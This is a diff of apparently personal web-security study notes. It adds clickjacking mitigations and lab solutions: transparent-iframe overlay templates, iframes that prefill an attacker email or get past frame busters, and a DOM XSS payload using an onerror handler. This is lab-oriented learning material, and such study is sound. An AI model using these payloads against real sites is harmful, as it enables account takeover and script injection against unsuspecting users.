@@ -2126,6 +2126,13 @@ Content-Type: application/json
 	</iframe>
 </body>
 ```
+**Mitigation**
+- 'X-Frame-Options: deny'  
+- `X-Frame-Options: sameorigin`
+- `X-Frame-Options: allow-from https://normal-website.com`
+- `Content-Security-Policy: frame-ancestors 'self';` or none
+- `Content-Security-Policy: frame-ancestors normal-website.com;`
+- 
 
 ### Clickjacking Lab
 - **Basic clickjacking** with CSRF token protection	
@@ -2152,16 +2159,43 @@ Content-Type: application/json
   - Substitute suitable pixel values for the **$height_value** and **$width_value** variables of the iframe (we suggest 700px and 500px respectively).   
   - Substitute suitable pixel values for the **$top_value** and **$side_value** variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).   
   - Set the **opacity** value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1.	  
-- Clickjacking with form input data prefilled from a URL parameter	
-  `<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`			
-- Clickjacking with a **frame buster** script	
+- Clickjacking with form input data prefilled from a URL parameter  
+  `<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`  			
+- Clickjacking with a **frame buster** script  
   `<iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`			
-- Exploiting clickjacking vulnerability to trigger DOM-based XSS	
-  `<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>`		
-- ddd
+- Exploiting clickjacking vulnerability to trigger DOM-based XSS  
+  `<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>`  	
+- Multistep clickjacking
+  - Delete account" button and the "Test me first
+  - "Yes" button on the confirmation page
+    ```
+    <style>
+	iframe {
+		position:relative;
+		width:$width_value;
+		height: $height_value;
+		opacity: $opacity;
+		z-index: 2;
+	}
+	.firstClick, .secondClick {
+		position:absolute;
+		top:$top_value1;
+		left:$side_value1;
+		z-index: 1;
+	}
+	.secondClick {
+		top:$top_value2;
+		left:$side_value2;
+	}
+	</style>
+	<div class="firstClick">Test me first</div>
+	<div class="secondClick">Test me next</div>
+	<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
+     ```
 
 ## XSS (Cross-Site Scripting)
-Details about XSS...
+**types of XSS attacks**
+- 
 
 ### XSS Lab
 
